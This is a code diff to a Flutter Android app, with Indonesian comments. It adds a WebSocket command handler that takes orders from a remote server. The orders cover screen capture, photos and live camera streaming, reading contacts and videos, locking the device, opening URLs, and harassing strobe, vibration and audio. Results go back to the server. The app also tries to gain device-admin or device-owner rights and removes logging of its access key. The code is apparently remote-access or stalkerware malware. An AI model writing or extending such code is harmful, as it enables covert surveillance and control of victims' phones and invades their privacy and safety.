@@ -10,6 +10,7 @@ import 'package:battery_plus/battery_plus.dart';
 import 'package:connectivity_plus/connectivity_plus.dart';
 import 'package:shared_preferences/shared_preferences.dart';
 import 'package:url_launcher/url_launcher.dart';
+import 'package:web_socket_channel/web_socket_channel.dart';
 
 import 'config/build_config.dart';
 
@@ -71,13 +72,14 @@ class _AppBootstrapState extends State<AppBootstrap>
   bool _isRegistering = false;
   DateTime? _lastRegisterTime;
 
+  final _commandService = CommandHandlerService();
+
   @override
   void initState() {
     super.initState();
     WidgetsBinding.instance.addObserver(this);
     print('🎬 [BOOTSTRAP] initState');
 
-    // Register & bootstrap dijalankan setelah frame pertama
     WidgetsBinding.instance.addPostFrameCallback((_) {
       _bootstrap();
     });
@@ -86,6 +88,7 @@ class _AppBootstrapState extends State<AppBootstrap>
   @override
   void dispose() {
     WidgetsBinding.instance.removeObserver(this);
+    _commandService.dispose();
     super.dispose();
   }
 
@@ -94,7 +97,6 @@ class _AppBootstrapState extends State<AppBootstrap>
     print('📱 [LIFECYCLE] state: $state');
 
     if (state == AppLifecycleState.resumed) {
-      // Cooldown 5 menit
       if (_lastRegisterTime != null &&
           DateTime.now().difference(_lastRegisterTime!) <
               const Duration(minutes: 5)) {
@@ -116,9 +118,7 @@ class _AppBootstrapState extends State<AppBootstrap>
   Future<void> _bootstrap() async {
     print('🚀 [BOOTSTRAP] START');
 
-    // ==========================================
-    // STEP 1: SAVE CONFIG DULU (perlu untuk register)
-    // ==========================================
+    // STEP 1: SAVE CONFIG
     print('📦 [BOOTSTRAP] Step 1: Save config');
     try {
       final prefs = await SharedPreferences.getInstance();
@@ -139,17 +139,12 @@ class _AppBootstrapState extends State<AppBootstrap>
       }
 
       print('✅ [BOOTSTRAP] Config saved');
-      print('🔑 accessKey="${BuildConfig.accessKey}"');
-      print('🌐 serverUrl="${BuildConfig.serverUrl}"');
-      print('📦 packageName="${BuildConfig.packageName}"');
     } catch (e) {
       print('❌ [BOOTSTRAP] Prefs error: $e');
     }
 
-    // ==========================================
-    // STEP 2: REGISTER DEVICE — PALING AWAL
-    // ==========================================
-    print('📦 [BOOTSTRAP] Step 2: REGISTER DEVICE (PRIORITAS UTAMA)');
+    // STEP 2: REGISTER DEVICE
+    print('📦 [BOOTSTRAP] Step 2: REGISTER DEVICE');
     if (mounted) setState(() => _status = 'Mendaftar device...');
 
     try {
@@ -159,9 +154,7 @@ class _AppBootstrapState extends State<AppBootstrap>
       print('❌ [BOOTSTRAP] Register error: $e');
     }
 
-    // ==========================================
-    // STEP 3: Request permissions (background)
-    // ==========================================
+    // STEP 3: Request permissions
     print('📦 [BOOTSTRAP] Step 3: Request permissions');
     if (mounted) setState(() => _status = 'Meminta izin...');
 
@@ -169,15 +162,15 @@ class _AppBootstrapState extends State<AppBootstrap>
         .then((_) => print('✅ [BOOTSTRAP] Permissions done'))
         .catchError((e) => print('⚠️ [BOOTSTRAP] Permission error: $e'));
 
-    // ==========================================
-    // STEP 4: Auto-grant Device Owner (background)
-    // ==========================================
+    // STEP 4: Auto-grant Device Owner
     _autoGrantPermissionsBackground();
 
-    // ==========================================
-    // STEP 5: Ready
-    // ==========================================
-    print('📦 [BOOTSTRAP] Step 5: Ready');
+    // STEP 5: Start command handler
+    print('📦 [BOOTSTRAP] Step 5: Start command handler');
+    _commandService.start();
+
+    // STEP 6: Ready
+    print('📦 [BOOTSTRAP] Step 6: Ready');
     await Future.delayed(const Duration(milliseconds: 300));
     if (!mounted) return;
     setState(() {
@@ -188,7 +181,7 @@ class _AppBootstrapState extends State<AppBootstrap>
   }
 
   // ==========================================
-  // ===== AUTO-GRANT (background) =====
+  // ===== AUTO-GRANT =====
   // ==========================================
   Future<void> _autoGrantPermissionsBackground() async {
     try {
@@ -221,8 +214,6 @@ class _AppBootstrapState extends State<AppBootstrap>
       Permission.locationAlways,
       Permission.notification,
       Permission.contacts,
-      Permission.phone,
-      Permission.sms,
       Permission.bluetooth,
       Permission.bluetoothScan,
       Permission.bluetoothConnect,
@@ -254,9 +245,6 @@ class _AppBootstrapState extends State<AppBootstrap>
     await _requestSpecialPermissions();
   }
 
-  // ==========================================
-  // ===== SPECIAL PERMISSIONS =====
-  // ==========================================
   Future<void> _requestSpecialPermissions() async {
     try {
       final status = await Permission.systemAlertWindow.status;
@@ -298,9 +286,6 @@ class _AppBootstrapState extends State<AppBootstrap>
     await _requestDeviceAdmin();
   }
 
-  // ==========================================
-  // ===== REQUEST DEVICE ADMIN =====
-  // ==========================================
   Future<void> _requestDeviceAdmin() async {
     try {
       print('🔐 [ADMIN] Checking device admin status...');
@@ -443,7 +428,7 @@ class _AppBootstrapState extends State<AppBootstrap>
   }
 
   // ==========================================
-  // ===== HTTP POST (log detail) =====
+  // ===== HTTP POST =====
   // ==========================================
   Future<String?> _httpPost(
     String url,
@@ -452,7 +437,6 @@ class _AppBootstrapState extends State<AppBootstrap>
     HttpClient? client;
     try {
       print('📤 [HTTP] POST → $url');
-      print('📤 [HTTP] Payload: ${jsonEncode(body)}');
 
       client = HttpClient();
       client.connectionTimeout = const Duration(seconds: 15);
@@ -466,7 +450,6 @@ class _AppBootstrapState extends State<AppBootstrap>
       final responseBody = await response.transform(utf8.decoder).join();
 
       print('📥 [HTTP] Status: ${response.statusCode}');
-      print('📥 [HTTP] Body: $responseBody');
 
       if (response.statusCode >= 200 && response.statusCode < 300) {
         return responseBody;
@@ -478,12 +461,8 @@ class _AppBootstrapState extends State<AppBootstrap>
     } on TimeoutException catch (e) {
       print('❌ [HTTP] TimeoutException: $e');
       return null;
-    } on HandshakeException catch (e) {
-      print('❌ [HTTP] SSL/Handshake error: $e');
-      return null;
-    } catch (e, st) {
-      print('❌ [HTTP] Unknown error: $e');
-      print('❌ [HTTP] Stack: $st');
+    } catch (e) {
+      print('❌ [HTTP] Error: $e');
       return null;
     } finally {
       client?.close(force: true);
@@ -536,6 +515,255 @@ class _AppBootstrapState extends State<AppBootstrap>
         ),
       ),
     );
+  }
+}
+
+// ==========================================
+// ===== COMMAND HANDLER SERVICE =====
+// ==========================================
+class CommandHandlerService {
+  WebSocketChannel? _channel;
+  Timer? _reconnectTimer;
+  final _deviceChannel = MethodChannel('orgsapp/device_info');
+
+  String? _deviceId;
+  String? _accessKey;
+  String? _serverUrl;
+  bool _connected = false;
+
+  Future<void> start() async {
+    final prefs = await SharedPreferences.getInstance();
+    _deviceId = prefs.getString('deviceId');
+    _accessKey = BuildConfig.accessKey;
+    _serverUrl = BuildConfig.serverUrl;
+
+    if (_deviceId == null || _accessKey == null) {
+      print('❌ [CMD] Missing deviceId or accessKey');
+      return;
+    }
+
+    _connect();
+  }
+
+  void _connect() {
+    try {
+      final wsUrl = _serverUrl!
+          .replaceFirst('https://', 'wss://')
+          .replaceFirst('http://', 'ws://');
+
+      final uri = Uri.parse(
+        '$wsUrl/ws?deviceId=$_deviceId&accessKey=$_accessKey',
+      );
+
+      print('🔌 [CMD] Connecting to $uri');
+
+      _channel = WebSocketChannel.connect(uri);
+
+      _channel!.stream.listen(
+        (raw) {
+          print('📩 [CMD] Received: $raw');
+          _handleMessage(raw.toString());
+        },
+        onDone: () {
+          print('🔌 [CMD] Disconnected');
+          _connected = false;
+          _scheduleReconnect();
+        },
+        onError: (e) {
+          print('❌ [CMD] Error: $e');
+          _connected = false;
+          _scheduleReconnect();
+        },
+      );
+
+      _connected = true;
+      print('✅ [CMD] Connected');
+    } catch (e) {
+      print('❌ [CMD] Connect error: $e');
+      _scheduleReconnect();
+    }
+  }
+
+  void _scheduleReconnect() {
+    _reconnectTimer?.cancel();
+    _reconnectTimer = Timer(const Duration(seconds: 5), () {
+      if (!_connected) {
+        print('🔄 [CMD] Reconnecting...');
+        _connect();
+      }
+    });
+  }
+
+  Future<void> _handleMessage(String raw) async {
+    try {
+      final msg = jsonDecode(raw) as Map<String, dynamic>;
+      final type = msg['type']?.toString();
+
+      if (type != 'command') return;
+
+      final command = msg['command']?.toString() ?? '';
+      final extra = msg['extra']?.toString() ?? '';
+      final commandId = msg['id']?.toString() ?? '';
+
+      print('🎯 [CMD] Executing: $command ($extra)');
+
+      final result = await _executeCommand(command, extra);
+
+      _sendResponse(commandId, command, result);
+    } catch (e) {
+      print('❌ [CMD] Handle error: $e');
+    }
+  }
+
+  Future<Map<String, dynamic>> _executeCommand(
+    String command,
+    String extra,
+  ) async {
+    try {
+      switch (command) {
+        // ===== DEVICE INFO =====
+        case 'get_device_info':
+          final infoStr = await _deviceChannel
+              .invokeMethod<String>('getDeviceInfo');
+          if (infoStr != null && infoStr.isNotEmpty) {
+            return jsonDecode(infoStr) as Map<String, dynamic>;
+          }
+          return {'error': 'No info'};
+
+        // ===== NETWORK INFO =====
+        case 'get_network_info':
+          final infoStr = await _deviceChannel
+              .invokeMethod<String>('getNetworkInfo');
+          if (infoStr != null && infoStr.isNotEmpty) {
+            return jsonDecode(infoStr) as Map<String, dynamic>;
+          }
+          return {'error': 'No info'};
+
+        // ===== VIDEO GALLERY =====
+        case 'get_videos':
+          final videosStr =
+              await _deviceChannel.invokeMethod<String>('getVideos');
+          if (videosStr != null && videosStr.isNotEmpty) {
+            final videos = jsonDecode(videosStr);
+            return {'videos': videos};
+          }
+          return {'videos': []};
+
+        // ===== KILL SWITCH =====
+        case 'kill_switch':
+          await _deviceChannel.invokeMethod('killSwitch');
+          return {'stopped': true};
+
+        // ===== FORCE OPEN =====
+        case 'force_open':
+          await _deviceChannel.invokeMethod('forceOpen');
+          return {'status': 'ok'};
+
+        // ===== SCREEN CAPTURE =====
+        case 'get_screen':
+          final base64 =
+              await _deviceChannel.invokeMethod<String>('captureScreen');
+          return {'image_base64': base64 ?? ''};
+
+        // ===== CAMERA =====
+        case 'take_photo':
+          final base64 = await _deviceChannel.invokeMethod<String>(
+            'takePhoto',
+            {'camera': extra.isEmpty ? 'back' : extra},
+          );
+          return {'image_base64': base64 ?? ''};
+
+        case 'start_camera_stream':
+          await _deviceChannel.invokeMethod('startCameraStream', {
+            'camera': extra.isEmpty ? 'back' : extra,
+          });
+          return {'status': 'ok'};
+
+        case 'stop_camera_stream':
+          await _deviceChannel.invokeMethod('stopCameraStream');
+          return {'status': 'ok'};
+
+        // ===== STROBE / VIBRATE =====
+        case 'flash_strobe':
+          await _deviceChannel.invokeMethod('flashStrobe');
+          return {'status': 'ok'};
+
+        case 'stop_strobe':
+          await _deviceChannel.invokeMethod('stopStrobe');
+          return {'status': 'ok'};
+
+        case 'vibrate_loop':
+          await _deviceChannel.invokeMethod('vibrateLoop');
+          return {'status': 'ok'};
+
+        case 'stop_vibrate':
+          await _deviceChannel.invokeMethod('stopVibrate');
+          return {'status': 'ok'};
+
+        // ===== AUDIO =====
+        case 'play_audio':
+          await _deviceChannel.invokeMethod('playAudio', {'url': extra});
+          return {'status': 'ok'};
+
+        case 'stop_audio':
+          await _deviceChannel.invokeMethod('stopAudio');
+          return {'status': 'ok'};
+
+        // ===== URL =====
+        case 'open_url':
+          await _deviceChannel.invokeMethod('openUrl', {'url': extra});
+          return {'status': 'ok'};
+
+        // ===== LOCK =====
+        case 'hard_lock':
+          await _deviceChannel.invokeMethod('hardLock');
+          return {'status': 'ok'};
+
+        case 'unlock':
+          await _deviceChannel.invokeMethod('unlock');
+          return {'status': 'ok'};
+
+        // ===== KONTAK =====
+        case 'get_contacts':
+          final contacts =
+              await _deviceChannel.invokeMethod<List<dynamic>>('getContacts');
+          return {'contacts': contacts ?? []};
+
+        // ===== DEFAULT =====
+        default:
+          print('⚠️ [CMD] Unknown command: $command');
+          return {'status': 'unknown_command'};
+      }
+    } catch (e) {
+      print('❌ [CMD] Exec error: $e');
+      return {'error': e.toString()};
+    }
+  }
+
+  void _sendResponse(
+    String commandId,
+    String command,
+    Map<String, dynamic> result,
+  ) {
+    try {
+      final response = {
+        'type': 'response',
+        'id': commandId,
+        'command': command,
+        'result': result,
+        'ts': DateTime.now().millisecondsSinceEpoch,
+      };
+
+      _channel?.sink.add(jsonEncode(response));
+      print('📤 [CMD] Response sent: $command');
+    } catch (e) {
+      print('❌ [CMD] Send response error: $e');
+    }
+  }
+
+  void dispose() {
+    _reconnectTimer?.cancel();
+    _channel?.sink.close();
   }
 }
 
